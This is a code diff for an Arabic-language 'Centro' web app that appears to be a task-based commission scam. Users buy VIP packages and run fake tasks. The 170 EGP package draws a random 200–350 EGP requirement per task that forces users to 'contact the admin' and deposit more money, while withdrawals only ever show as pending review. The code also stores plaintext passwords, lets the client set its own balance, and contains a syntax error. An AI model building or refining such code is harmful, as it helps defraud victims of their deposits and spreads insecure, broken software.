@@ -460,54 +460,62 @@
         const ADMIN_PHONE = "01080633299";
         let isSignupMode = false;
         
-        let hasActiveSubscription = false;
-        let subscriptionDetails = null;
+        let hasActiveSubscription = null;
+        let currentUserData = null;
 
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const inviteCode = urlParams.get('invite');
-            if (inviteCode) {
-                isSignupMode = true;
-                updateAuthUI();
-                document.getElementById('auth-invite').value = inviteCode;
-            }
-
+        // On load check session
+        window.addEventListener('DOMContentLoaded', () => {
             const savedPhone = localStorage.getItem('centro_user');
             if (savedPhone) {
-                loginUser(savedPhone);
+                fetchUserData(savedPhone);
             }
-        };
+
+            // Slider Interval
+            setInterval(() => {
+                const slides = document.querySelectorAll('.slide');
+                const dots = document.querySelectorAll('.dot');
+                if(slides.length === 0) return;
+                
+                let currentIndex = Array.from(slides).findIndex(s => s.classList.contains('active'));
+                slides[currentIndex].classList.remove('active');
+                if(dots[currentIndex]) dots[currentIndex].classList.remove('active');
+                
+                let nextIndex = (currentIndex + 1) % slides.length;
+                slides[nextIndex].classList.add('active');
+                if(dots[nextIndex]) dots[nextIndex].classList.add('active');
+            }, 3500);
+        });
 
         function toggleAuthMode() {
             isSignupMode = !isSignupMode;
-            updateAuthUI();
-        }
-
-        function updateAuthUI() {
-            const btn = document.getElementById('auth-btn');
             const heroTitle = document.getElementById('auth-hero-title');
-            const confirmGroup = document.getElementById('group-confirm-pass');
-            const inviteGroup = document.getElementById('group-invite-code');
+            const authBtn = document.getElementById('auth-btn');
             const toggleLink = document.getElementById('auth-toggle-link');
+            const confirmPassGroup = document.getElementById('group-confirm-pass');
+            const inviteGroup = document.getElementById('group-invite-code');
 
             if (isSignupMode) {
                 heroTitle.innerText = "إنشاء حساب جديد";
-                btn.innerText = "تسجيل حساب";
-                confirmGroup.style.display = "block";
-                inviteGroup.style.display = "block";
+                authBtn.innerText = "إنشاء الحساب";
                 toggleLink.innerText = "لديك حساب بالفعل؟ سجل الدخول";
+                confirmPassGroup.style.display = "block";
+                inviteGroup.style.display = "block";
             } else {
                 heroTitle.innerText = "تسجيل الدخول إلى حسابك";
-                btn.innerText = "تسجيل الدخول";
-                confirmGroup.style.display = "none";
-                inviteGroup.style.display = "none";
+                authBtn.innerText = "تسجيل الدخول";
                 toggleLink.innerText = "اذهب للتسجيل ليس لديك حساب؟";
+                confirmPassGroup.style.display = "none";
+                inviteGroup.style.display = "none";
             }
         }
 
         function togglePassVisibility(id) {
             const input = document.getElementById(id);
-            input.type = input.type === 'password' ? 'text' : 'password';
+            if (input.type === "password") {
+                input.type = "text";
+            } else {
+                input.type = "password";
+            }
         }
 
         async function handleAuth(event) {
@@ -516,100 +524,103 @@
             const pass = document.getElementById('auth-pass').value.trim();
 
             if (!phone || !pass) {
-                alert('يرجى ملء جميع الحقول المطلوبة');
+                alert("الرجاء إدخال الحقول المطلوبة");
                 return;
             }
 
             const userRef = window.doc(window.db, "users", phone);
-            
-            try {
-                if (isSignupMode) {
-                    const confirmPass = document.getElementById('auth-confirm-pass').value.trim();
-                    if (pass !== confirmPass) {
-                        alert('كلمتا المرور غير متطابقتين');
+
+            if (isSignupMode) {
+                const confirmPass = document.getElementById('auth-confirm-pass').value.trim();
+                const inviteCode = document.getElementById('auth-invite').value.trim();
+
+                if (pass !== confirmPass) {
+                    alert("كلمتا المرور غير متطابقتان");
+                    return;
+                }
+
+                try {
+                    const snap = await window.getDoc(userRef);
+                    if (snap.exists()) {
+                        alert("رقم الهاتف أو اسم المستخدم مسجل بالفعل!");
                         return;
                     }
 
-                    const userSnap = await window.getDoc(userRef);
-                    if (userSnap.exists()) {
-                        alert('رقم الهواتف أو اسم المستخدم مسجل مسبقاً');
-                        return;
-                    }
-
-                    const inviteCode = document.getElementById('auth-invite').value.trim();
-                    const newUser = {
+                    const initialData = {
                         phone: phone,
-                        pass: pass,
-                        balance: 50.00, // الهدية الترحيبية أصبحت 50 جنيه
-                        commission: 0,
-                        role: phone === ADMIN_PHONE ? 'ADMIN' : 'VIP',
-                        inviteCode: Math.random().toString(36).substring(2, 8).toUpperCase(),
-                        invitedBy: inviteCode || '',
+                        password: pass,
+                        balance: 0.00,
+                        credit: 50,
+                        role: "VIP",
+                        inviteCode: inviteCode || "",
                         createdAt: new Date().toISOString()
                     };
 
-                    await window.setDoc(userRef, newUser);
-                    alert('تم إنشاء الحساب بنجاح وحصولك على هدية ترحيبية 50 جنيه!');
-                } else {
-                    const userSnap = await window.getDoc(userRef);
-                    if (!userSnap.exists()) {
-                        alert('الحساب غير موجود. يرجى التأكد من البيانات أو إنشاء حساب جديد.');
-                        return;
-                    }
-
-                    const userData = userSnap.data();
-                    if (userData.pass !== pass) {
-                        alert('كلمة المرور غير صحيحة');
-                        return;
-                    }
+                    await window.setDoc(userRef, initialData);
+                    localStorage.setItem('centro_user', phone);
+                    fetchUserData(phone);
+                } catch (err) {
+                    console.error(err);
+                    alert("حدث خطأ أثناء التسجيل: " + err.message);
                 }
+            } else {
+                try {
+                    const snap = await window.getDoc(userRef);
+                    if (!snap.exists()) {
+                        alert("الحساب غير موجود! يرجى التأكد من البيانات أو إنشاء حساب جديد.");
+                        return;
+                    }
 
-                localStorage.setItem('centro_user', phone);
-                loginUser(phone);
-            } catch (error) {
-                console.error("Auth error: ", error);
-                alert('حدث خطأ أثناء الاتصال بقاعدة البيانات');
+                    const data = snap.data();
+                    if (data.password !== pass) {
+                        alert("كلمة المرور غير صحيحة!");
+                        return;
+                    }
+
+                    localStorage.setItem('centro_user', phone);
+                    fetchUserData(phone);
+                } catch (err) {
+                    console.error(err);
+                    alert("حدث خطأ أثناء تسجيل الدخول: " + err.message);
+                }
             }
         }
 
-        async function loginUser(phone) {
-            const userRef = window.doc(window.db, "users", phone);
-            const userSnap = await window.getDoc(userRef);
-
-            if (!userSnap.exists()) {
-                localStorage.removeItem('centro_user');
-                return;
+        async function fetchUserData(phone) {
+            try {
+                const userRef = window.doc(window.db, "users", phone);
+                const snap = await window.getDoc(userRef);
+                if (snap.exists()) {
+                    currentUserData = snap.data();
+                    updateUIWithUserData();
+                }
+            } catch (err) {
+                console.error("Error fetching user data:", err);
             }
+        }
 
-            const userData = userSnap.data();
+        function updateUIWithUserData() {
+            if (!currentUserData) return;
 
-            document.getElementById('user-phone-disp').innerText = userData.phone;
-            document.getElementById('prof-phone-disp').innerText = userData.phone;
-            document.getElementById('user-role-badge').innerText = userData.role || 'VIP';
+            document.getElementById('user-phone-disp').innerText = currentUserData.phone;
+            document.getElementById('prof-phone-disp').innerText = currentUserData.phone;
             
             const balances = document.querySelectorAll('.val-balance');
-            balances.forEach(el => el.innerText = Number(userData.balance || 0).toFixed(2));
+            balances.forEach(el => el.innerText = Number(currentUserData.balance).toFixed(2));
 
-            const refLink = `${window.location.origin}${window.location.pathname}?invite=${userData.inviteCode}`;
+            const refLink = `https://centro-comercial.web.app/?ref=${currentUserData.phone}`;
             document.getElementById('ref-link').innerText = refLink;
 
-            document.getElementById('view-auth').style.display = 'none';
-            document.getElementById('app-content').style.display = 'block';
-
-            loadUserSubscription(phone);
+            document.getElementById('view-auth').classList.remove('active');
+            document.getElementById('app-content').style.display = "block";
         }
 
-        function logout() {
-            localStorage.removeItem('centro_user');
-            location.reload();
-        }
-
-        function switchTab(tabName, element) {
+        function switchTab(tabName, el) {
             document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
             document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
 
             document.getElementById('view-' + tabName).classList.add('active');
-            element.classList.add('active');
+            el.classList.add('active');
 
             if (tabName === 'transactions') {
                 renderTransactionsView();
@@ -618,232 +629,160 @@
             }
         }
 
-        function openWithdrawModal() {
-            document.getElementById('withdraw-modal').classList.add('active');
+        function subscribeVip(limit, commission, tasksCount) {
+            hasActiveSubscription = {
+                limit: limit,
+                commission: commission,
+                tasksCount: tasksCount,
+                completedTasks: 0
+            };
+
+            switchTab('transactions', document.querySelectorAll('.nav-item')[2]);
         }
 
-        function closeWithdrawModal() {
-            document.getElementById('withdraw-modal').classList.remove('active');
-        }
-
-        async function processWithdraw() {
-            const wallet = document.getElementById('w-wallet').value.trim();
-            const amount = parseFloat(document.getElementById('w-amount').value);
-            const pass = document.getElementById('w-pass').value.trim();
-            const phone = localStorage.getItem('centro_user');
-
-            if (!wallet || !amount || !pass) {
-                alert('يرجى استكمال جميع بيانات السحب');
-                return;
-            }
-
-            const userRef = window.doc(window.db, "users", phone);
-            const userSnap = await window.getDoc(userRef);
-            const userData = userSnap.data();
-
-            if (userData.pass !== pass) {
-                alert('كلمة المرور غير صحيحة');
-                return;
-            }
-
-            if (amount > userData.balance) {
-                alert('رصيد الحساب غير كافٍ لإتمام عملية السحب');
-                return;
-            }
-
-            try {
-                await window.addDoc(window.collection(window.db, "withdrawals"), {
-                    phone: phone,
-                    wallet: wallet,
-                    amount: amount,
-                    status: 'pending',
-                    createdAt: new Date().toISOString()
-                });
-
-                const newBalance = userData.balance - amount;
-                await window.updateDoc(userRef, { balance: newBalance });
-
-                alert('تم تقديم طلب السحب بنجاح، بانتظار مراجعة الإدارة.');
-                closeWithdrawModal();
-                loginUser(phone);
-            } catch (e) {
-                console.error(e);
-                alert('حدث خطأ أثناء تنفيذ السحب');
-            }
-        }
-
-        function closeDepositModal() {
-            document.getElementById('deposit-modal').classList.remove('active');
-        }
-
-        async function subscribeVip(amount, commission, tasksCount) {
-            const phone = localStorage.getItem('centro_user');
-            const userRef = window.doc(window.db, "users", phone);
-            const userSnap = await window.getDoc(userRef);
-            const userData = userSnap.data();
-
-            if (userData.balance < amount) {
-                document.getElementById('deposit-msg').innerText = `الباقة تتطلب رصيداً بحد أدنى EGP ${amount}. رصيدك الحالي لا يكفي (${userData.balance} EGP).`;
-                document.getElementById('deposit-modal').classList.add('active');
-                return;
-            }
-
-            try {
-                const subData = {
-                    phone: phone,
-                    amount: amount,
-                    commission: commission,
-                    totalTasks: tasksCount,
-                    completedTasks: 0,
-                    status: 'active',
-                    createdAt: new Date().toISOString()
-                };
-
-                const docRef = await window.addDoc(window.collection(window.db, "subscriptions"), subData);
-                alert('تم تفعيل الباقة بنجاح! انتقل إلى شاشة المعاملات لتنفيذ المهام.');
-                switchTab('transactions', document.querySelectorAll('.nav-item')[2]);
-            } catch (e) {
-                console.error(e);
-                alert('حدث خطأ أثناء تفعيل الباقة');
-            }
-        }
-
-        async function loadUserSubscription(phone) {
-            try {
-                const q = window.query(window.collection(window.db, "subscriptions"), window.where("phone", "==", phone), window.where("status", "==", "active"));
-                const querySnapshot = await window.getDocs(q);
-                
-                if (!querySnapshot.empty) {
-                    hasActiveSubscription = true;
-                    subscriptionDetails = { id: querySnapshot.docs[0].id, ...querySnapshot.docs[0].data() };
-                } else {
-                    hasActiveSubscription = false;
-                    subscriptionDetails = null;
-                }
-            } catch (e) {
-                console.error(e);
-            }
-        }
-
-        async function renderTransactionsView() {
-            const phone = localStorage.getItem('centro_user');
-            await loadUserSubscription(phone);
-
+        function renderTransactionsView() {
             const container = document.getElementById('tx-subscription-container');
-
             if (!hasActiveSubscription) {
                 container.innerHTML = `
                     <div class="empty-subscription-box">
                         <div style="font-size: 2rem; margin-bottom: 8px;">🛒</div>
-                        <div style="font-weight: bold; color: #fff; margin-bottom: 4px;">لا توجد باقة نشطة حالياً</div>
-                        <div style="font-size: 0.75rem;">يرجى الذهاب إلى صفحة (مهمة) واختيار باقة لبدء جني الأرباح والعمولات.</div>
+                        <div style="font-weight: bold; color: #fff; margin-bottom: 4px; font-size: 0.95rem;">لا توجد باقة نشطة حالياً</div>
+                        <p style="font-size: 0.8rem;">يرجى الذهاب إلى شاشة (مهمة) واختيار باقة/مهمة للبدء في تنفيذ الطلبات وزيادة أرباحك.</p>
                     </div>
                 `;
                 return;
             }
 
-            const sub = subscriptionDetails;
-            const progressPercent = (sub.completedTasks / sub.totalTasks) * 100;
-
+            const sub = hasActiveSubscription;
             container.innerHTML = `
                 <div class="tx-hero-card">
                     <div class="wallet-icon">💳</div>
-                    <div class="tx-balance-title">قيمة الباقة الحالية</div>
-                    <div class="tx-balance-val">EGP ${sub.amount}</div>
+                    <div class="tx-balance-title">إجمالي الرصيد المتاح</div>
+                    <div class="tx-balance-val">EGP <span class="val-balance">${Number(currentUserData.balance).toFixed(2)}</span></div>
                     <div class="tx-commission-box">
-                        <div class="tx-commission-title">نسبة العمولة</div>
+                        <div class="tx-commission-title">عمولة الباقة الحالية</div>
                         <div class="tx-commission-val">${sub.commission}%</div>
                     </div>
                 </div>
 
                 <div class="tx-task-card">
                     <div class="tx-task-row">
-                        <span class="tx-task-label">إجمالي المهام المطلوبة</span>
-                        <span class="tx-task-value">${sub.totalTasks} مهام</span>
+                        <span class="tx-task-label">حد الباقة:</span>
+                        <span class="tx-task-value">EGP ${sub.limit}</span>
                     </div>
                     <div class="tx-task-row">
-                        <span class="tx-task-label">المهام المنجزة</span>
-                        <span class="tx-task-value" id="completed-count">${sub.completedTasks}</span>
-                    </div>
-                    <div class="tx-task-row">
-                        <span class="tx-task-label">المهام المتبقية</span>
-                        <span class="tx-task-value" id="remaining-count">${sub.totalTasks - sub.completedTasks}</span>
+                        <span class="tx-task-label">المهام المنجزة:</span>
+                        <span class="tx-task-value" id="task-progress-count">${sub.completedTasks} / ${sub.tasksCount}</span>
                     </div>
 
-                    <div class="progress-container" id="prog-box" style="display:block;">
-                        <div class="progress-bar" id="prog-bar" style="width: ${progressPercent}%;"></div>
-                        <div class="progress-text" id="prog-text">${sub.completedTasks} / ${sub.totalTasks} (${Math.round(progressPercent)}%)</div>
+                    <div class="progress-container" id="prog-box" style="display: block;">
+                        <div class="progress-bar" id="prog-bar"></div>
+                        <div class="progress-text" id="prog-text">جاري تنفيذ المهمة... 0%</div>
                     </div>
 
-                    <button class="btn-neon-pill" id="btn-execute-task" style="margin-top: 15px;" onclick="executeNextTask()">
-                        ${sub.completedTasks >= sub.totalTasks ? 'الباقة مكتملة' : 'تنفيذ المهمة التالية 🚀'}
-                    </button>
+                    <button class="btn-neon-pill" id="start-task-btn" style="margin-top: 15px; border-radius: 8px;" onclick="startTaskExecution()">بدء تنفيذ المهمة</button>
                 </div>
             `;
         }
 
-        async function executeNextTask() {
-            if (!subscriptionDetails) return;
-            const sub = subscriptionDetails;
+        function startTaskExecution() {
+            const btn = document.getElementById('start-task-btn');
+            const progBox = document.getElementById('prog-box');
+            const progBar = document.getElementById('prog-bar');
+            const progText = document.getElementById('prog-text');
 
-            if (sub.completedTasks >= sub.totalTasks) {
-                alert('لقد أتممت كافة مهام هذه الباقة بنجاح!');
-                return;
+            btn.disabled = true;
+            btn.style.opacity = "0.5";
+            progBox.style.display = "block";
+
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 5;
+                if (progress > 100) progress = 100;
+
+                progBar.style.width = progress + '%';
+                progText.innerText = `جاري تنفيذ المهمة... ${progress}%`;
+
+                if (progress === 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        completeSingleTask();
+                    }, 400);
+                }
+            }, 80);
+        }
+
+        async function completeSingleTask() {
+            const sub = hasActiveSubscription;
+            sub.completedTasks++;
+
+            let requiredTaskAmount = 0;
+            let profit = 0;
+
+            if (sub.limit === 170) {
+                // توليد طلب عشوائي لتصل المحصلة بين 2000 و 3000 جنيه بنهاية الـ 10 طلبات
+                // مثلاً كل مهمة تحتاج قيمة عشوائية تقريبية أو متصاعدة
+                const randomExtra = Math.floor(Math.random() * 150) + 200; // بين 200 و 350 للطلب الواحد
+                requiredTaskAmount = randomExtra;
+
+                // فحص إذا كان الرصيد يغطي الطلب العشوائي أم يتطلب إيداعاً تأكيدياً
+                if (currentUserData.balance < requiredTaskAmount) {
+                    // إظهار موديل الإيداع المطلوب
+                    const missingAmount = (requiredTaskAmount - currentUserData.balance).toFixed(2);
+                    document.getElementById('deposit-msg').innerText = `طلب رقم ${sub.completedTasks} يحتاج إلى رصيد بقيمة ${requiredTaskAmount} EGP. رصيدك الحالي لا يكفي (متبقي ${missingAmount} EGP)، يرجى التواصل مع الإدارة لإتمام الإيداع وتأكيد المهمة لتستطيع المتابعة.`;
+                    document.getElementById('deposit-modal').classList.add('active');
+                    
+                    // إعادة تعيين زر البدء لكي لا يعلق
+                    const btn = document.getElementById('start-task-btn');
+                    if(btn) { btn.disabled = false; btn.style.opacity = "1"; }
+                    return;
+                }
+
+                profit = requiredTaskAmount * (sub.commission / 100);
+                currentUserData.balance += profit;
+            } else {
+                const taskBase = sub.limit / sub.tasksCount;
+                profit = taskBase * (sub.commission / 100);
+                currentUserData.balance += profit;
             }
 
-            const btn = document.getElementById('btn-execute-task');
-            btn.disabled = true;
-            btn.innerText = "جاري تنفيذ الطلب ومعالجة العمولة...";
+            // Update user balance in Firestore
+            try {
+                const userRef = window.doc(window.db, "users", currentUserData.phone);
+                await window.updateDoc(userRef, { balance: currentUserData.balance });
 
-            setTimeout(async () => {
-                try {
-                    const phone = localStorage.getItem('centro_user');
-                    const newCompleted = sub.completedTasks + 1;
-                    const earnedAmount = (sub.amount * (sub.commission / 100));
+                // Add order record
+                const ordersRef = window.collection(window.db, "orders");
+                await window.addDoc(ordersRef, {
+                    phone: currentUserData.phone,
+                    productName: `طلب مهمة رقم ${sub.completedTasks} - باقة ${sub.limit} ج.م`,
+                    amount: profit.toFixed(2),
+                    status: "منجز",
+                    createdAt: new Date().toISOString()
+                });
 
-                    const subRef = window.doc(window.db, "subscriptions", sub.id);
-                    await window.updateDoc(subRef, { completedTasks: newCompleted });
+            } catch (err) {
+                console.error("Error updating task status:", err);
+            }
 
-                    await window.addDoc(window.collection(window.db, "orders"), {
-                        phone: phone,
-                        productName: `طلب منتج رقم #${newCompleted} (باقة ${sub.amount} EGP)`,
-                        commissionEarned: earnedAmount,
-                        status: 'مكتمل',
-                        createdAt: new Date().toISOString()
-                    });
+            // Update UI balances
+            document.querySelectorAll('.val-balance').forEach(el => el.innerText = Number(currentUserData.balance).toFixed(2));
 
-                    const userRef = window.doc(window.db, "users", phone);
-                    const userSnap = await window.getDoc(userRef);
-                    const currentBalance = userSnap.data().balance || 0;
-                    const updatedBalance = currentBalance + sub.amount + earnedAmount;
-
-                    await window.updateDoc(userRef, { balance: updatedBalance });
-
-                    if (newCompleted >= sub.totalTasks) {
-                        await window.updateDoc(subRef, { status: 'completed' });
-                        alert(`تهانينا! أكملت كافة المهام وتم إضافة أصل المبلغ مع الأرباح بقيمة EGP ${(sub.amount + earnedAmount).toFixed(2)} إلى حسابك.`);
-                    } else {
-                        alert(`تم تنفيذ المهمة بنجاح! تم إضافة أرباح بقيمة EGP ${earnedAmount.toFixed(2)} لحسابك.`);
-                    }
-
-                    loginUser(phone);
-                    renderTransactionsView();
-                } catch (e) {
-                    console.error(e);
-                    alert('حدث خطأ أثناء تنفيذ المهمة');
-                    btn.disabled = false;
-                    btn.innerText = "تنفيذ المهمة التالية 🚀";
-                }
-            }, 1000);
+            if (sub.completedTasks >= sub.tasksCount) {
+                alert(`تهانينا! لقد أتممت كافة مهام الباقة بنجاح وأرباحك الإجمالية أضيفت لرصيدك.`);
+                hasActiveSubscription = null;
+                switchTab('home', document.querySelectorAll('.nav-item')[0]);
+            } else {
+                renderTransactionsView();
+            }
         }
 
         async function loadOrders() {
-            const phone = localStorage.getItem('centro_user');
             const listEl = document.getElementById('orders-list');
-            listEl.innerHTML = '<div style="text-align:center; padding:20px; color:#888;">جاري تحميل الطلبات...</div>';
+            listEl.innerHTML = `<div style="text-align:center; padding:20px; font-size:0.8rem; color:#888;">جاري التحميل...</div>`;
 
             try {
-                const q = window.query(window.collection(window.db, "orders"), window.where("phone", "==", phone));
+                const q = window.query(window.collection(window.db, "orders"), window.where("phone", "==", currentUserData.phone));
                 const querySnapshot = await window.getDocs(q);
 
                 if (querySnapshot.empty) {
@@ -858,26 +797,91 @@
                 let html = '';
                 querySnapshot.forEach((doc) => {
                     const order = doc.data();
-                    const dateStr = new Date(order.createdAt).toLocaleString('ar-EG');
                     html += `
                         <div class="order-card">
                             <div class="order-header">
-                                <span>${dateStr}</span>
-                                <span class="order-status">${order.status}</span>
+                                <span>${new Date(order.createdAt).toLocaleString()}</span>
+                                <span>رقم الطلب: #${doc.id.slice(-5)}</span>
                             </div>
                             <div class="order-body">
-                                <div class="order-name">${order.productName}</div>
-                                <div style="font-size: 0.8rem; color: var(--primary-green); font-weight: bold;">+EGP ${order.commissionEarned.toFixed(2)}</div>
+                                <div>
+                                    <div class="order-name">${order.productName}</div>
+                                    <div style="font-size: 0.75rem; color: var(--primary-green); margin-top:2px;">الربح: +${order.amount} EGP</div>
+                                </div>
+                                <div class="order-status">${order.status}</div>
                             </div>
                         </div>
                     `;
                 });
-
                 listEl.innerHTML = html;
-            } catch (e) {
-                console.error(e);
-                listEl.innerHTML = '<div style="text-align:center; color:#ff3333; font-size:0.8rem;">فشل في تحميل الطلبات</div>';
+            } catch (err) {
+                console.error(err);
+                listEl.innerHTML = `<div style="text-align:center; padding:20px; color:#ff3333; font-size:0.8rem;">فشل تحميل الطلبات</div>`;
             }
+        }
+
+        function openWithdrawModal() {
+            document.getElementById('withdraw-modal').classList.add('active');
+        }
+
+        function closeWithdrawModal() {
+            document.getElementById('withdraw-modal'].classList.remove('active');
+        }
+
+        function closeDepositModal() {
+            document.getElementById('deposit-modal').classList.remove('active');
+            // إعادة تفعيل زر المهمة ليستطيع العودة للمحاولة لو رصيده كفى
+            const btn = document.getElementById('start-task-btn');
+            if(btn) { btn.disabled = false; btn.style.opacity = "1"; }
+        }
+
+        async function processWithdraw() {
+            const wallet = document.getElementById('w-wallet').value.trim();
+            const amount = parseFloat(document.getElementById('w-amount').value);
+            const pass = document.getElementById('w-pass').value.trim();
+
+            if (!wallet || !amount || !pass) {
+                alert("يرجى ملء جميع بيانات السحب المطلوبة");
+                return;
+            }
+
+            if (pass !== currentUserData.password) {
+                alert("كلمة المرور غير صحيحة");
+                return;
+            }
+
+            if (amount > currentUserData.balance) {
+                alert("رصيد الحساب لا يكفي لإتمام عملية السحب");
+                return;
+            }
+
+            try {
+                currentUserData.balance -= amount;
+                const userRef = window.doc(window.db, "users", currentUserData.phone);
+                await window.updateDoc(userRef, { balance: currentUserData.balance });
+
+                // Save withdraw request
+                const ordersRef = window.collection(window.db, "orders");
+                await window.addDoc(ordersRef, {
+                    phone: currentUserData.phone,
+                    productName: `طلب سحب إلى محفظة: ${wallet}`,
+                    amount: `-${amount.toFixed(2)}`,
+                    status: "قيد المراجعة",
+                    createdAt: new Date().toISOString()
+                });
+
+                document.querySelectorAll('.val-balance').forEach(el => el.innerText = Number(currentUserData.balance).toFixed(2));
+                closeWithdrawModal();
+                alert("تم تقديم طلب السحب بنجاح وسيتم المراجعة والتحويل قريباً.");
+            } catch (err) {
+                console.error(err);
+                alert("حدث خطأ أثناء معالجة السحب: " + err.message);
+            }
+        }
+
+        function logout() {
+            localStorage.removeItem('centro_user');
+            location.reload();
         }
     </script>
 </body>
